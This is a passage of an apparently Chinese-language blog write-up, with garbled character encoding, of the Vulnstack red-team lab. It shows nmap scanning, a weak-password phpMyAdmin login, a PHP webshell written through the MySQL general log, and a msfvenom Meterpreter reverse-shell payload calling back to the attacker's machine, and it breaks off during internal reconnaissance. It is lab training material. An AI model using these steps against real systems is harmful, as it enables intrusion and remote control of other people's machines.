{"pageProps":{"postData":{"id":"Vulnstackçº¢é˜Ÿè¯„ä¼°å®æˆ˜é¶åœº(ä¸€)","contentHtml":"<h1>ATT&#x26;CKçº¢é˜Ÿè¯„ä¼°å®æˆ˜é¶åœº(ä¸€)</h1>\n<blockquote>\n<p><a href=\"http://vulnstack.qiyuanxuetang.net/vuln/detail/2/\">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>\n</blockquote>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image.png\" alt=\"æ‹“æ‰‘\"></p>\n<h2>é¶åœºæ­å»º</h2>\n<ul>\n<li>\n<p>é¶æœºé€šç”¨å¯†ç ï¼š<code>hongrisec@2019</code></p>\n</li>\n<li>\n<p><code>ip</code>ç½‘ç»œè®¾ç½®</p>\n<p>åˆ›å»ºä¸€ä¸ªä»…ä¸»æœºçš„è™šæ‹Ÿç½‘å¡ï¼Œç½‘æ®µæ˜¯<code>192.168.52.0</code> ï¼Œ<code>nat</code>ç½‘å¡éšæ„<code>ip</code>ï¼Œç”¨æ¥æ¨¡æ‹Ÿ<code>web</code>æœåŠ¡å™¨å¤–ç½‘ï¼Œæˆ‘è¿™é‡Œæ˜¯<code>192.168.75.0</code>ç½‘æ®µ</p>\n<p>å†…ç½‘ä¸»æœº<code>windows 2003</code>ä»¥åŠ<code>windows 2008</code>ä½¿ç”¨ä»…ä¸»æœºçš„è™šæ‹Ÿç½‘å¡</p>\n<p>è¾¹ç¼˜ä¸»æœº<code>windows 7</code>ä½¿ç”¨ä»…ä¸»æœºçš„è™šæ‹Ÿç½‘å¡ä»¥åŠ<code>nat</code>ç½‘å¡</p>\n<p>æ¸—é€ä¸»æœº<code>kali</code>ä¹Ÿä½¿ç”¨<code>nat</code>ç½‘å¡ï¼ˆ<code>192.168.75.151</code>ï¼‰</p>\n</li>\n<li>\n<p>æµ‹è¯•ç½‘ç»œ</p>\n<p>è¾¹ç¼˜ä¸»æœºå¯ä»¥<code>ping</code>é€šå¤–ç½‘ä»¥åŠåŸŸæˆå‘˜ï¼Œå…¶ä»–ä¸¤ä¸ªåŸŸæˆå‘˜ä¸èƒ½é€šå¤–ç½‘</p>\n</li>\n<li>\n<p>åœ¨è¾¹ç¼˜ä¸»æœº<code>win7</code> çš„<code>c</code>ç›˜æ‰“å¼€<code>phpstudy</code> ï¼Œç„¶åå°†æœåŠ¡å¯åŠ¨ï¼ˆå‡å¦‚<code>phpmystudy</code>æ‰“å¼€æŠ¥é”™ï¼Œå°±æŠŠè™šæ‹Ÿæœºå…¼å®¹æ€§æ”¹ä¸º<code>17.x</code>ï¼‰</p>\n</li>\n<li>\n<p>é¶åœºç¯å¢ƒæ­å»ºå®Œæˆï¼Œå¼€å§‹æ¸—é€</p>\n</li>\n</ul>\n<h2>ä¸»æœºå‘ç°ç«¯å£æ‰«æ</h2>\n<ol>\n<li>\n<p>ä½¿ç”¨<code>nmap</code>æ‰«æç½‘æ®µç±»å­˜æ´»ä¸»æœº</p>\n<p>å› ä¸ºé¶æœºæ˜¯æˆ‘æœ€åæ·»åŠ çš„ï¼Œæ‰€ä»¥é¶æœºIPæ˜¯<code>186</code></p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>                    \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-12 22:26 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00019</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00016</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.186</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00024</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">55</span>:CF:<span class=\"hljs-number\">64</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00024</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:E8:BD:<span class=\"hljs-title function_ invoke__\">A6</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.151</span>\n</code></pre>\n</li>\n<li>\n<p>æ‰«æä¸»æœºå¼€æ”¾ç«¯å£</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.186</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-12 22:26 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.186</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00061</span>s latency).\nNot shown: <span class=\"hljs-number\">65532</span> filtered tcp <span class=\"hljs-title function_ invoke__\">ports</span> (no-response)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">80</span>/tcp   open  http\n<span class=\"hljs-number\">135</span>/tcp  open  msrpc\n<span class=\"hljs-number\">3306</span>/tcp open  mysql\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">55</span>:CF:<span class=\"hljs-number\">64</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>æ‰«æä¸»æœºæœåŠ¡ç‰ˆæœ¬ä»¥åŠç³»ç»Ÿç‰ˆæœ¬</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">3306</span>,<span class=\"hljs-number\">135</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.186</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-12 22:27 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.186</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00042</span>s latency).\n\nPORT     STATE SERVICE VERSION\n<span class=\"hljs-number\">80</span>/tcp   open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">23</span> ((Win32) OpenSSL/<span class=\"hljs-number\">1.0</span>.<span class=\"hljs-number\">2</span>j PHP/<span class=\"hljs-number\">5.4</span>.<span class=\"hljs-number\">45</span>)\n<span class=\"hljs-number\">135</span>/tcp  open  msrpc   Microsoft Windows RPC\n<span class=\"hljs-number\">3306</span>/tcp open  mysql   <span class=\"hljs-title function_ invoke__\">MySQL</span> (unauthorized)\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">55</span>:CF:<span class=\"hljs-number\">64</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nAggressive OS guesses: Microsoft Windows Phone <span class=\"hljs-number\">7.5</span> <span class=\"hljs-keyword\">or</span> <span class=\"hljs-number\">8.0</span> (<span class=\"hljs-number\">96</span>%), Microsoft Windows Embedded Standard <span class=\"hljs-number\">7</span> (<span class=\"hljs-number\">96</span>%), Microsoft Windows <span class=\"hljs-number\">8.1</span> <span class=\"hljs-title function_ invoke__\">R1</span> (<span class=\"hljs-number\">94</span>%), Microsoft Windows Server <span class=\"hljs-number\">2008</span> <span class=\"hljs-keyword\">or</span> <span class=\"hljs-number\">2008</span> Beta <span class=\"hljs-number\">3</span> (<span class=\"hljs-number\">92</span>%), Microsoft Windows Server <span class=\"hljs-number\">2008</span> R2 <span class=\"hljs-keyword\">or</span> Windows <span class=\"hljs-number\">8.1</span> (<span class=\"hljs-number\">92</span>%), Microsoft Windows <span class=\"hljs-number\">7</span> Professional <span class=\"hljs-keyword\">or</span> Windows <span class=\"hljs-number\">8</span> (<span class=\"hljs-number\">92</span>%), Microsoft Windows Vista SP0 <span class=\"hljs-keyword\">or</span> SP1, Windows Server <span class=\"hljs-number\">2008</span> SP1, <span class=\"hljs-keyword\">or</span> Windows <span class=\"hljs-number\">7</span> (<span class=\"hljs-number\">92</span>%), Microsoft Windows Vista SP2, Windows <span class=\"hljs-number\">7</span> SP1, <span class=\"hljs-keyword\">or</span> Windows Server <span class=\"hljs-number\">2008</span> (<span class=\"hljs-number\">92</span>%), Microsoft Windows Server <span class=\"hljs-number\">2008</span> R2 <span class=\"hljs-title function_ invoke__\">SP1</span> (<span class=\"hljs-number\">90</span>%), Microsoft Windows Server <span class=\"hljs-number\">2008</span> <span class=\"hljs-title function_ invoke__\">SP1</span> (<span class=\"hljs-number\">89</span>%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> <span class=\"hljs-title function_ invoke__\">host</span> (test conditions non-ideal).\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Windows; CPE: cpe:/o:microsoft:window\n</code></pre>\n</li>\n<li>\n<p>æ‰«ææ¼æ´</p>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">135</span>,<span class=\"hljs-number\">3306</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>                                                                                                                                                               \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">12</span> <span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">28</span> CST                                                                                                                                                \nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>                                                                                                                                                                               \nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00066</span>s latency).                                                                                                                                                                                    \n                                                                                                                                                                                                                  \nPORT     STATE SERVICE                                                                                                                                                                                            \n<span class=\"hljs-number\">80</span>/tcp   <span class=\"hljs-built_in\">open</span>  http                                                                                                                                                                                               \n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.                                                                                                                                                             \n| http-sql-injection:                                                                                                                                                                                             \n|   Possible sqli for queries:                                                                                                                                                                                    \n|     http://192.168.75.186:80/l.php?act=phpinfo%27%20OR%20sqlspider                                                                                                                                              \n|     http://192.168.75.186:80/l.php?act=Function%27%20OR%20sqlspider                                                                                                                                             \n|     http://192.168.75.186:80/l.php?act=phpinfo%27%20OR%20sqlspider                                                                                                                                              \n|     http://192.168.75.186:80/l.php?act=Function%27%20OR%20sqlspider                                                                                                                                             \n|     http://192.168.75.186:80/l.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000%27%20OR%20sqlspider                                                                                                                 \n|     http://192.168.75.186:80/l.php?=PHPE9568F35-D428-11d2-A769-00AA001ACF42%27%20OR%20sqlspider                                                                                                                 \n|     http://192.168.75.186:80/l.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42%27%20OR%20sqlspider                                                                                                                 \n|   Possible sqli for forms:                                                                                                                                                                                      \n|     Form at path: /, form'</span>s action: /l.php<span class=\"hljs-comment\">#bottom. Fields that might be vulnerable:                                                                                                                             </span>\n|       host                                                                                                                                                                                                      \n|       port                                                                                                                                                                                                      \n|       login                                                                                                                                                                                                     \n|       funName                                                                                                                                                                                                   \n|     Form at path: /l.php, form<span class=\"hljs-string\">'s action: /l.php#bottom. Fields that might be vulnerable:                                                                                                                        \n|       host                                                                                                                                                                                                      \n|       port                                                                                                                                                                                                      \n|       login                                                                                                                                                                                                     \n|_      funName                                                                                                                                                                                                   \n| http-slowloris-check:                                                                                                                                                                                                   \n|_http-trace: TRACE is enabled                                     \n|_http-stored-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> stored XSS vulnerabilities.                                         \n| http-phpself-xss:                                 \n|   VULNERABLE:                                     \n|   Unsafe use of $_SERVER[<span class=\"hljs-string\">\"PHP_SELF\"</span>] <span class=\"hljs-keyword\">in</span> PHP files                                                      \n|     State: VULNERABLE (Exploitable)               \n|       PHP files are <span class=\"hljs-keyword\">not</span> handling safely the variable $_SERVER[<span class=\"hljs-string\">\"PHP_SELF\"</span>] causing Reflected Cross Site Scripting vulnerabilities.\n|                                                   \n|     Extra information:                            \n|                                                   \n|   Vulnerable files <span class=\"hljs-keyword\">with</span> proof of concept:         \n|     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>/l.php/%<span class=\"hljs-number\">27</span>%<span class=\"hljs-number\">22</span>/%3E%3Cscript%3Ealert(<span class=\"hljs-number\">1</span>)%3C/script%3E                            \n|   Spidering limited to: maxdepth=<span class=\"hljs-number\">3</span>; maxpagecount=<span class=\"hljs-number\">20</span>; withinhost=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>                         \n|     References:                \n|   Spidering limited to: maxdepth=<span class=\"hljs-number\">3</span>; maxpagecount=<span class=\"hljs-number\">20</span>; withinhost=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>                         \n|     References:                                   \n|       https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)                                       \n|_      http://php.net/manual/en/reserved.variables.server.php                                           \n| http-enum:                                        \n|   /phpinfo.php: Possible information file         \n|   /phpmyadmin/: phpMyAdmin                        \n|   /phpMyAdmin/: phpMyAdmin                        \n|_  /PHPMyAdmin/: phpMyAdmin                        \n<span class=\"hljs-number\">135</span>/tcp  <span class=\"hljs-built_in\">open</span>  msrpc                                \n<span class=\"hljs-number\">3306</span>/tcp <span class=\"hljs-built_in\">open</span>  mysql                                \nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">55</span>:CF:<span class=\"hljs-number\">64</span> (VMware)\n</code></pre>\n<p>æ‰«æå‘ç°<code>135</code>ç«¯å£ï¼Œå› ä¸ºä¹Ÿæ˜¯<code>window</code>ä¸»æœºï¼Œæ‰€ä»¥å¯èƒ½æœ‰ç”¨</p>\n<p>ä¸è¿‡è¿˜æ˜¯ä»<code>web</code>æ¸—é€å¼€å§‹ï¼Œå‘ç°å¯èƒ½æ˜¯<code>sql</code>æ³¨å…¥çš„åœ°æ–¹ï¼Œä¹Ÿå‘ç°äº†<code>phpmyadmin</code></p>\n</li>\n</ol>\n<h2>webæ¸—é€</h2>\n<ol>\n<li>\n<p>è®¿é—®ä¸»é¡µ</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image1.png\" alt=\"image.png\"></p>\n<p>å‘ç°æ˜¯<code>phpStudyæ¢é’ˆ</code> èƒ½æš´éœ²å‡ºå¾ˆå¤šä¸œè¥¿</p>\n<ul>\n<li>ä¸»æœºç‰ˆæœ¬ <code>Windows 7 Business Edition Service Pack 1</code></li>\n<li>æœåŠ¡ç‰ˆæœ¬ <code>Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45</code></li>\n<li>ç½‘ç«™çš„ç»å¯¹è·¯å¾„ <code>C:/phpStudy/WWW</code></li>\n<li><code>PHP</code> å·²ç»å®‰è£…çš„æ¨¡å—</li>\n</ul>\n</li>\n<li>\n<p>æ‹‰å–åˆ°æœ€ä¸‹é¢æœ‰ä¸ª<code>MySQLæ•°æ®åº“è¿æ¥æ£€æµ‹</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image2.png\" alt=\"image.png\"></p>\n<p>æˆ‘ä»¬å°è¯•å¼±å£ä»¤è´¦æˆ·å¯†ç éƒ½ä½¿ç”¨<code>root</code> ï¼Œæµ‹è¯•é“¾æ¥æˆåŠŸâ€¦.</p>\n</li>\n<li>\n<p>ä¸ç®¡æ€ä¹ˆè¯´ï¼Œæˆ‘ä»¬å…ˆå¯¹ç½‘ç«™è¿›è¡Œç›®å½•æ‰«æ</p>\n<pre><code class=\"hljs language-python\">gobuster <span class=\"hljs-built_in\">dir</span> -u http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span> -w /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt -x php,html,<span class=\"hljs-built_in\">zip</span>,txt | grep -v <span class=\"hljs-string\">\"403\"</span>\n===============================================================\nGobuster v3<span class=\"hljs-number\">.6</span>\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>\n[+] Method:                  GET\n[+] Threads:                 <span class=\"hljs-number\">10</span>\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-<span class=\"hljs-built_in\">list</span>-<span class=\"hljs-number\">2.3</span>-medium.txt\n[+] Negative Status codes:   <span class=\"hljs-number\">404</span>\n[+] User Agent:              gobuster/<span class=\"hljs-number\">3.6</span>\n[+] Extensions:              php,html,<span class=\"hljs-built_in\">zip</span>,txt\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/l.php                (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">14735</span>]\n/L.php                (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">14735</span>]\n/phpmyadmin           (Status: <span class=\"hljs-number\">301</span>) [Size: <span class=\"hljs-number\">241</span>] [--> http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>/phpmyadmin/]\n/phpinfo.php          (Status: <span class=\"hljs-number\">200</span>) [Size: <span class=\"hljs-number\">71329</span>]\n/phpMyAdmin           (Status: <span class=\"hljs-number\">301</span>) [Size: <span class=\"hljs-number\">241</span>] [--> http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>/phpMyAdmin/]\nProgress: <span class=\"hljs-number\">1102800</span> / <span class=\"hljs-number\">1102805</span> (<span class=\"hljs-number\">100.00</span>%)\n===============================================================\nFinished\n===============================================================\n</code></pre>\n<p>æ²¡æ‰¾åˆ°ä»€ä¹ˆ</p>\n</li>\n<li>\n<p>å‰é¢çŸ¥é“æ•°æ®åº“è´¦å·å¯†ç éƒ½æ˜¯<code>root</code>ï¼Œæ‰€ä»¥ç›´æ¥ç™»å½•<code>phpmyadmin</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image3.png\" alt=\"image.png\"></p>\n<p>ç™»é™†æˆåŠŸ</p>\n</li>\n<li>\n<p>å°è¯•åˆ©ç”¨<code>phpmyadmin</code>åå°<code>getshell</code></p>\n<ul>\n<li>\n<p>å°è¯•ä½¿ç”¨<code>outfile</code>ç­‰æ–¹æ³•ï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“äº†ç½‘ç«™çš„ç»å¯¹è·¯å¾„</p>\n<p>é¦–å…ˆæŸ¥çœ‹<code>secure_file_priv</code>æƒé™</p>\n<pre><code class=\"hljs language-python\">SHOW GLOBAL VARIABLES LIKE <span class=\"hljs-string\">'%secure%'</span>\n//\nsecure_file_priv \tNULL\n</code></pre>\n<p><code>NULL</code>å°±æ— æ³•åˆ©ç”¨äº†</p>\n</li>\n<li>\n<p>ä½¿ç”¨æ—¥å¿—æ–‡ä»¶å†™å…¥<code>shell</code></p>\n<ol>\n<li>\n<p>é¦–å…ˆæŸ¥çœ‹å…¨å±€æ—¥å¿—æ–‡ä»¶æ˜¯å¦å¼€å¯</p>\n<pre><code class=\"hljs language-python\">SHOW VARIABLES LIKE <span class=\"hljs-string\">'%general%'</span>\n//\ngeneral_log \tOFF\ngeneral_log_file \tC:\\phpStudy\\MySQL\\data\\stu1.log\n</code></pre>\n</li>\n<li>\n<p>æˆ‘ä»¬ä¸¤ä¸ªå‚æ•°éƒ½è¦è¿›è¡Œè®¾ç½®ï¼Œå°†<code>general_log</code> è®¾ç½®ä¸º<code>ON</code> ï¼Œå°†<code>general_log_file</code> è®¾ç½®åœ¨ç½‘ç«™ç›®å½•é‡Œé¢çš„æ–‡ä»¶</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-built_in\">set</span> <span class=\"hljs-keyword\">global</span> general_log = <span class=\"hljs-string\">\"ON\"</span>;\n<span class=\"hljs-built_in\">set</span> <span class=\"hljs-keyword\">global</span> general_log_file=<span class=\"hljs-string\">'C:/phpStudy/WWW/test.php'</span>;\n</code></pre>\n</li>\n<li>\n<p>è®¾ç½®å®Œåå†æ£€æŸ¥å‚æ•°æ˜¯å¦è®¾ç½®æˆåŠŸ</p>\n<pre><code class=\"hljs language-python\">general_log \tON\ngeneral_log_file \tC:/phpStudy/WWW/test.php\n</code></pre>\n</li>\n<li>\n<p>è®¾ç½®æˆåŠŸï¼Œç„¶åæˆ‘ä»¬åœ¨æ‰§è¡Œæ è¾“å…¥æ¶æ„è¯­å¥</p>\n<pre><code class=\"hljs language-python\">select <span class=\"hljs-string\">\"&#x3C;?php eval($_POST[1]); ?>\"</span>;\n</code></pre>\n</li>\n<li>\n<p>æ‰§è¡Œå®Œåï¼Œä¼šè¢«å†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶é‡Œï¼ˆ<code>C:/phpStudy/WWW/test.php</code>ï¼‰ï¼Œå°±æ˜¯å·²ç»å°†ä¸€å¥è¯æœ¨é©¬å†™å…¥äº†<code>test.php</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image4.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n</li>\n</ul>\n</li>\n<li>\n<p>ä½¿ç”¨èšğŸ—¡è¿æ¥</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image5.png\" alt=\"image.png\"></p>\n<p>è¿æ¥æˆåŠŸï¼Œç›¸å½“äº<code>getshell</code>äº†å·²ç»</p>\n</li>\n<li>\n<p>åœ¨èšğŸ—¡æŸ¥çœ‹å½“å‰ç›®å½•</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image6.png\" alt=\"image.png\"></p>\n<ul>\n<li>\n<p>å­˜åœ¨<code>beifen.rar</code> ï¼Œæˆ‘ä»¬å°†å®ƒæ‹‰å–ä¸‹æ¥æŸ¥çœ‹</p>\n<p>è§£å‹å‡ºæ¥æ˜¯<code>yxcms</code>çš„æºç ï¼Œè¡¨ç¤ºå­˜åœ¨<code>yxcms</code></p>\n</li>\n<li>\n<p>è¿˜å­˜åœ¨<code>yxcms</code> ç›®å½•ï¼Œå°±æ˜¯ä½¿ç”¨ä¸Šé¢å‹ç¼©åŒ…çš„æºç æ­å»ºçš„</p>\n</li>\n</ul>\n</li>\n<li>\n<p>æµè§ˆå™¨è®¿é—®<code>yxcms</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image7.png\" alt=\"image.png\"></p>\n<p>æœç„¶æ˜¯æ­å»ºäº†ï¼Œä½†æ˜¯æˆ‘ä»¬å·²ç»èƒ½è¿æ¥äº†ï¼Œå°±æ²¡å¿…è¦å¹²è¿™é‡Œäº†</p>\n</li>\n</ol>\n<h2>è·å¾—shell</h2>\n<ol>\n<li>\n<p>ä¸Šé¢èšğŸ—¡å·²ç»è¿æ¥äº†ï¼Œåˆ°è¿™æ­¥å°±æ˜¯è¦è·å¾—<code>shell</code>äº†</p>\n</li>\n<li>\n<p><code>kali</code>åˆ¶ä½œåå¼¹<code>shell</code>é©¬ï¼ŒæŒ‡å®š<code>-e x86/shikata_ga_nai</code> æ˜¯å› ä¸ºé¶æœºä¸Šå¯èƒ½å­˜åœ¨æ€è½¯</p>\n<pre><code class=\"hljs language-python\">msfvenom -p windows/meterpreter_reverse_tcp LHOST=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span> LPORT=<span class=\"hljs-number\">1234</span> -e x86/shikata_ga_nai -f exe -o shell.exe\n</code></pre>\n</li>\n<li>\n<p>é€šè¿‡èšğŸ—¡ä¸Šä¼ é©¬åˆ°é¶æœºä¸Š</p>\n</li>\n<li>\n<p><code>kali</code>å¼€å¯ç›‘å¬</p>\n<pre><code class=\"hljs language-python\">msf6 exploit(multi/handler) > use exploit/multi/handler\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> payload windows/x64/meterpreter_reverse_tcp\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lport <span class=\"hljs-number\">1234</span>\nmsf6 exploit(multi/handler) > run\n</code></pre>\n</li>\n<li>\n<p>é€šè¿‡èšğŸ—¡å¯åŠ¨é©¬</p>\n<pre><code class=\"hljs language-python\">C:\\phpStudy\\WWW> shell.exe\n</code></pre>\n<pre><code class=\"hljs language-python\">[*] Started reverse TCP handler on <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>:<span class=\"hljs-number\">1234</span> \n[*] Meterpreter session <span class=\"hljs-number\">5</span> opened (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>:<span class=\"hljs-number\">1234</span> -> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.186</span>:<span class=\"hljs-number\">2114</span>) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">13</span> <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">32</span> +0800\n\nmeterpreter > \n</code></pre>\n<p>è·å¾—<code>shell</code> ï¼Œä¸Šçº¿<code>MSF</code></p>\n</li>\n</ol>\n<h2>å†…ç½‘ä¿¡æ¯æ”¶é›†</h2>\n<ol>\n<li>\n<p>æŸ¥çœ‹å½“å‰é¶æœºIP</p>\n<pre><code class=\"hljs language-python\">meterpreter > ipconfig                                                                                                                                                                                                                                                                                                                                                                                                          \nInterface <span class=\"hljs-number\">11</span>                                                                                                                                                                                                      \n============                                                                                                                                                                                                      \nName         : Intel(R) PRO/<span class=\"hljs-number\">1000</span> MT Network Connection                                                                                                                                                            \nHardware MAC : <span class=\"hljs-number\">00</span>:0c:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">55</span>:cf:5a                                                                                                                                                                                  \nMTU          : <span class=\"hljs-number\">1500</span>                                                                                                                                                                                               \nIPv4 Address : <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.52</span><span class=\"hljs-number\">.143</span>                                                                                                                                                                                     \nIPv4 Netmask : <span class=\"hljs-number\">255.255</span><span class=\"hljs-number\">.255</span><span class=\"hljs-number\">.0</span>                                                                                                                                                                                      \nIPv6 Address : fe80::69c6:31ff:4e4e:e80b            \nIPv6 Netmask : ffff:ffff:ffff:ffff:: \nInterface <span class=\"hljs-number\">26</span>\n============\nName         : Intel(R) PRO/<span class=\"hljs-number\">1000</span> MT Network Connection <span class=\"hljs-comment\">#3</span>\nHardware 